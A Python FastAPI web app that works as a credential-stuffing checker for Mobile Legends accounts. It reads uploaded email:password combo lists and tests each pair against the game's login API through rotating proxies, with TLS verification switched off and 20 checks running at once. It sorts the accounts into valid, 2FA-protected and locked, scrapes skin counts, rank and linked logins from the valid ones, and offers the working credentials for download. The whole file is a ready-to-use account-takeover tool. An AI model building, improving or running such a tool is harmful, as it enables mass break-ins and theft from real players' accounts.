from fastapi import FastAPI, UploadFile, Form, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import random, asyncio, traceback
import httpx

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

results = {
    "total": 0,
    "working": 0,
    "invalid": 0,
    "2fa_required": 0,
    "locked": 0,
    "valid_accounts": [],
    "2fa_accounts": [],
    "locked_accounts": [],
}

# Load proxies
with open("proxies.txt", "r") as f:
    proxies = [p.strip() for p in f if p.strip()]

# Proxy formatter
def get_proxy_url():
    raw = random.choice(proxies)
    ip, port, user, pwd = raw.split(":")
    return f"http://{user}:{pwd}@{ip}:{port}"

async def get_async_client():
    proxy_url = get_proxy_url()
    transport = httpx.AsyncHTTPTransport(proxy=proxy_url, verify=False)
    return httpx.AsyncClient(transport=transport, timeout=httpx.Timeout(10.0))

async def get_profile(access_token, user_id):
    url = "https://accountmtapi.mobilelegends.com/Account/profile"
    headers = {"Authorization": f"Bearer {access_token}"}
    data = {"user_id": user_id, "format": 2}

    for _ in range(3):
        try:
            async with await get_async_client() as client:
                res = await client.post(url, data=data, headers=headers)
                if res.status_code == 200:
                    info = res.json().get("data", {})
                    total_skins = info.get("skin_count", 0)
                    rank = info.get("rank_name", "Unknown")
                    bindings = [b.get("bind_type", "Unknown") for b in info.get("bind_list", [])]
                    return total_skins, rank, bindings
        except Exception:
            print("Error fetching profile, retrying...")
            traceback.print_exc()
            await asyncio.sleep(1)
    return 0, "Unknown", []

async def check_account(email, password):
    login_url = "https://accountmtapi.mobilelegends.com/Account/login"
    data = {"email": email, "password": password, "os_type": 2, "format": 2, "secret": ""}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    for _ in range(3):
        try:
            async with await get_async_client() as client:
                res = await client.post(login_url, data=data, headers=headers)
                results["total"] += 1
                if res.status_code == 200:
                    resp_json = res.json()
                    code = resp_json.get("code")

                    if code == 200:
                        access_token = resp_json["data"]["access_token"]
                        user_id = resp_json["data"]["user_id"]
                        skins, rank, bindings = await get_profile(access_token, user_id)
                        account_info = {
                            "email": email,
                            "password": password,
                            "skins": skins,
                            "rank": rank,
                            "bindings": ", ".join(bindings),
                        }
                        results["working"] += 1
                        results["valid_accounts"].append(account_info)
                        print(f"[+] Valid account: {email}")
                        return "working"

                    elif code == 403:
                        results["2fa_required"] += 1
                        results["2fa_accounts"].append({"email": email, "password": password})
                        print(f"[!] 2FA required: {email}")
                        return "2fa_required"

                    elif code == 423:
                        results["locked"] += 1
                        results["locked_accounts"].append({"email": email, "password": password})
                        print(f"[-] Account locked/banned: {email}")
                        return "locked"

                    else:
                        results["invalid"] += 1
                        print(f"[-] Invalid account (code {code}): {email}")
                        return "invalid"

                else:
                    print(f"[-] HTTP error {res.status_code} for {email}")
                    results["invalid"] += 1
                    return "invalid"
        except Exception:
            print("Error checking account, retrying...")
            traceback.print_exc()
            await asyncio.sleep(1)
    return "error"

@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    return templates.TemplateResponse("index.html", {"request": request, **results})

@app.post("/upload")
async def upload(file: UploadFile):
    content = await file.read()
    accounts = []
    for line in content.decode().splitlines():
        if ":" in line:
            email, password = line.strip().split(":", 1)
            accounts.append((email, password))

    semaphore = asyncio.Semaphore(20)

    async def limited_check(email, password):
        async with semaphore:
            return await check_account(email, password)

    tasks = [limited_check(email, password) for email, password in accounts]
    await asyncio.gather(*tasks)
    return JSONResponse({"status": "done", **results})

@app.post("/manual")
async def manual(email: str = Form(...), password: str = Form(...)):
    status = await check_account(email, password)
    return JSONResponse({"status": status, **results})

@app.get("/download")
async def download(type: str = "working"):
    if type == "working":
        return JSONResponse({"working": results["valid_accounts"]})
    elif type == "2fa":
        return JSONResponse({"2fa_required": results["2fa_accounts"]})
    elif type == "locked":
        return JSONResponse({"locked": results["locked_accounts"]})
    else:
        return JSONResponse({"error": "Invalid type. Use working, 2fa, or locked."})
